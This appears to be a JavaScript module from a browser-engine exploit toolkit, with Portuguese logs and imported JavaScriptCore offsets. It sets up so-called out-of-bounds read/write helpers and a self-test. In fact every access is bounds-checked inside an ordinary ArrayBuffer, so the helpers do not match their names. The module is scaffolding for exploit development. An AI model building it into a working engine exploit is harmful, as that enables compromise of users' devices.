// js/core_exploit.mjs
import { AdvancedInt64, isAdvancedInt64Object, toHex as utilsToHex } from './utils.mjs';
import { logS3 as log } from './script3/s3_utils.mjs';
import { OOB_CONFIG, JSC_OFFSETS, updateOOBConfigFromUI } from './config.mjs';

export let oob_array_buffer_real = null;
export let oob_dataview_real = null;

const toHexHelper = (val, bits = 32) => utilsToHex(val, bits);

export function clearOOBEnvironment() {
    oob_array_buffer_real = null;
    oob_dataview_real = null;
}

function ensureOOBConfigUpdated() {
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined" && document.readyState !== 'loading') {
        updateOOBConfigFromUI(document);
    }
}

export async function triggerOOB_primitive(currentLogFn = log) {
    const FNAME = 'CoreExploit.triggerOOB_primitive';
    ensureOOBConfigUpdated();
    currentLogFn(`--- Iniciando ${FNAME} ---`, 'test', FNAME);
    currentLogFn(`   Config OOB: AllocSize=${OOB_CONFIG.ALLOCATION_SIZE}, BaseOffsetDV=${OOB_CONFIG.BASE_OFFSET_IN_DV}`, 'info', FNAME);
    clearOOBEnvironment();
    try {
        if (OOB_CONFIG.ALLOCATION_SIZE <= 0) throw new Error(`Tamanho de Alocação OOB inválido: ${OOB_CONFIG.ALLOCATION_SIZE}.`);
        if (OOB_CONFIG.BASE_OFFSET_IN_DV < 0) throw new Error(`Base Offset DV inválido: ${OOB_CONFIG.BASE_OFFSET_IN_DV}.`);
        const totalSizeForArrayBuffer = OOB_CONFIG.BASE_OFFSET_IN_DV + OOB_CONFIG.ALLOCATION_SIZE + 128;
        if (totalSizeForArrayBuffer <= 0 ) throw new Error(`Cálculo de tamanho total inválido: ${totalSizeForArrayBuffer}.`);
        oob_array_buffer_real = new ArrayBuffer(totalSizeForArrayBuffer);
        if (OOB_CONFIG.BASE_OFFSET_IN_DV + OOB_CONFIG.ALLOCATION_SIZE > oob_array_buffer_real.byteLength) {
            throw new Error(`Janela DataView excede ArrayBuffer: DV_offset(${OOB_CONFIG.BASE_OFFSET_IN_DV}) + DV_length(${OOB_CONFIG.ALLOCATION_SIZE}) > AB_total_length(${oob_array_buffer_real.byteLength})`);
        }
        oob_dataview_real = new DataView(oob_array_buffer_real, OOB_CONFIG.BASE_OFFSET_IN_DV, OOB_CONFIG.ALLOCATION_SIZE);
        currentLogFn(`Ambiente para Operações OOB CONFIGURADO.`, 'vuln', FNAME);
        currentLogFn(`   oob_array_buffer_real (total): ${oob_array_buffer_real.byteLength} bytes`, 'info', FNAME);
        currentLogFn(`   oob_dataview_real (janela OOB): offset_no_AB_real=${oob_dataview_real.byteOffset}, length=${oob_dataview_real.byteLength} bytes`, 'info', FNAME);
    } catch (e) {
        currentLogFn(`ERRO CRÍTICO ao tentar configurar ambiente OOB: ${e.name} - ${e.message}`, "error", FNAME);
        console.error("Erro detalhado em triggerOOB_primitive:", e);
        oob_array_buffer_real = null; oob_dataview_real = null;
    }
    currentLogFn(`--- ${FNAME} Concluído ---`, 'test', FNAME);
}

export function oob_read_absolute(absolute_offset_in_real_buffer, byteLength = 4, currentLogFn = log) {
    if (!oob_array_buffer_real) {
        currentLogFn("ERRO: oob_array_buffer_real não ativo para leitura absoluta.", "error", "CoreExploit.ReadAbs");
        throw new Error("OOB Read Absolute: Ambiente não ativo.");
    }
    if (absolute_offset_in_real_buffer < 0 || absolute_offset_in_real_buffer + byteLength > oob_array_buffer_real.byteLength) {
        currentLogFn(`ERRO Leitura OOB Abs: Offset ${toHexHelper(absolute_offset_in_real_buffer)} (len ${byteLength}) FORA dos limites de oob_array_buffer_real (${oob_array_buffer_real.byteLength}b).`, "error", "CoreExploit.ReadAbs");
        throw new RangeError(`OOB Read Absolute: Fora dos limites.`);
    }
    const tempView = new DataView(oob_array_buffer_real);
    try {
        if (byteLength === 1) return tempView.getUint8(absolute_offset_in_real_buffer);
        if (byteLength === 2) return tempView.getUint16(absolute_offset_in_real_buffer, true);
        if (byteLength === 4) return tempView.getUint32(absolute_offset_in_real_buffer, true);
        if (byteLength === 8) {
            const low = tempView.getUint32(absolute_offset_in_real_buffer, true);
            const high = tempView.getUint32(absolute_offset_in_real_buffer + 4, true);
            return new AdvancedInt64(low, high);
        }
        throw new Error("Tamanho de leitura OOB (abs) inválido: " + byteLength);
    } catch (e) {
        currentLogFn(`Exceção durante oob_read_absolute em offset ${toHexHelper(absolute_offset_in_real_buffer)}: ${e.name} - ${e.message}`, "error", "CoreExploit.ReadAbs");
        throw e;
    }
}

export function oob_write_absolute(absolute_offset_in_real_buffer, value, byteLength = 4, currentLogFn = log) {
    if (!oob_array_buffer_real) {
        currentLogFn("ERRO: oob_array_buffer_real não ativo para escrita absoluta.", "error", "CoreExploit.WriteAbs");
        throw new Error("OOB Write Absolute: Ambiente não ativo.");
    }
     if (absolute_offset_in_real_buffer < 0 || absolute_offset_in_real_buffer + byteLength > oob_array_buffer_real.byteLength) {
        currentLogFn(`ERRO Escrita OOB Abs: Offset ${toHexHelper(absolute_offset_in_real_buffer)} (len ${byteLength}) FORA dos limites de oob_array_buffer_real (${oob_array_buffer_real.byteLength}b).`, "error", "CoreExploit.WriteAbs");
        throw new RangeError(`OOB Write Absolute: Fora dos limites.`);
    }
    const tempView = new DataView(oob_array_buffer_real);
    try {
        if (byteLength === 1) { tempView.setUint8(absolute_offset_in_real_buffer, Number(value)); return; }
        if (byteLength === 2) { tempView.setUint16(absolute_offset_in_real_buffer, Number(value), true); return; }
        if (byteLength === 4) { tempView.setUint32(absolute_offset_in_real_buffer, Number(value), true); return; }
        if (byteLength === 8) {
            let valToSet = value;
            if (typeof value === 'number') {
                valToSet = AdvancedInt64.fromNumber(value);
            }
            if (!isAdvancedInt64Object(valToSet)) {
                throw new TypeError("Para escrita OOB 8-byte, o valor deve ser um AdvancedInt64 ou um número JS convertível.");
            }
            tempView.setUint32(absolute_offset_in_real_buffer, valToSet.low(), true);
            tempView.setUint32(absolute_offset_in_real_buffer + 4, valToSet.high(), true);
            return;
        }
        throw new Error("Tamanho/valor de escrita OOB (abs) inválido: " + byteLength + ", valor: " + String(value));
    } catch (e) {
        currentLogFn(`Exceção durante oob_write_absolute em offset ${toHexHelper(absolute_offset_in_real_buffer)}: ${e.name} - ${e.message}`, "error", "CoreExploit.WriteAbs");
        throw e;
    }
}

export async function testCoreExploitModule(logFnParam) {
    const FNAME_TEST = "CoreExploit.testModule";
    const currentLog = logFnParam || log;

    currentLog(`--- Testando Módulo CoreExploit (core_exploit.mjs) ---`, "test", FNAME_TEST);
    await triggerOOB_primitive(currentLog);
    if (!oob_array_buffer_real) {
        currentLog("Falha ao configurar ambiente OOB. Teste do módulo abortado.", "error", FNAME_TEST);
        return;
    }
    const safe_offset_within_dataview_window = Math.floor(OOB_CONFIG.ALLOCATION_SIZE / 2);
    const safe_abs_offset = OOB_CONFIG.BASE_OFFSET_IN_DV + safe_offset_within_dataview_window;
    const test_val32 = 0x12345678;
    const test_val64 = new AdvancedInt64("0xAABBCCDDEEFF0011");

    try {
        currentLog(`Escrevendo ${toHexHelper(test_val32)} em offset absoluto ${toHexHelper(safe_abs_offset)}`, "info", FNAME_TEST);
        oob_write_absolute(safe_abs_offset, test_val32, 4, currentLog);
        const read_val32 = oob_read_absolute(safe_abs_offset, 4, currentLog);
        if (read_val32 === test_val32) {
            currentLog(`SUCESSO: Lido ${toHexHelper(read_val32)} corretamente (32bit).`, "good", FNAME_TEST);
        } else {
            currentLog(`FALHA: Lido ${toHexHelper(read_val32)}, esperado ${toHexHelper(test_val32)}.`, "error", FNAME_TEST);
        }

        const next_abs_offset = safe_abs_offset + 4;
        currentLog(`Escrevendo ${test_val64.toString(true)} em offset absoluto ${toHexHelper(next_abs_offset)}`, "info", FNAME_TEST);
        oob_write_absolute(next_abs_offset, test_val64, 8, currentLog);
        const read_val64 = oob_read_absolute(next_abs_offset, 8, currentLog);

        if (isAdvancedInt64Object(read_val64) && read_val64.equals(test_val64)) {
            currentLog(`SUCESSO: Lido ${read_val64.toString(true)} corretamente (64bit).`, "good", FNAME_TEST);
        } else {
            const readValStr = isAdvancedInt64Object(read_val64) ? read_val64.toString(true) : String(read_val64);
            currentLog(`FALHA: Lido ${readValStr}, esperado ${test_val64.toString(true)}.`, "error", FNAME_TEST);
        }
    } catch (e) {
        currentLog(`ERRO durante o teste do módulo CoreExploit: ${e.name} - ${e.message}`, "error", FNAME_TEST);
        console.error("Erro em CoreExploit.testModule:", e);
    }
    currentLog(`--- Teste CoreExploit Concluído ---`, "test", FNAME_TEST);
    clearOOBEnvironment();
}
